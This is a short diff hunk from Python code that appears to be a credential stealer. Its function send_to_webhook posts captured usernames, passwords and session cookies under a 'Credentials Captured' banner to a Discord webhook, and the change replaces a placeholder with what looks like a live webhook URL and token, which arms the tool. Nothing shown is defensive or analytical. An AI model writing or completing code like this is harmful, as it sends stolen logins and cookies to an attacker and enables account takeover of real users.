@@ -51,7 +51,7 @@ def generate_random_username():
     return ''.join(random.choice(chars) for _ in range(7))
 
 def send_to_webhook(username, password, cookie):
-    WEBHOOK_URL = "https://discord.com/api/webhooks/yourwebhookhere"
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1394819125548945518/LDs586v2YzSuGSXyHDfPMd6RzLNYPRxrVd5sKaXUhr2xAC1eheR9AXnNZkHWQLgiEOJj"
     
     data = {
         "content": f"🚨 **Credentials Captured** 🚨\n\n**Username:** `{username}`\n**Password:** `{password}`\n**Cookie:** `{cookie}`",
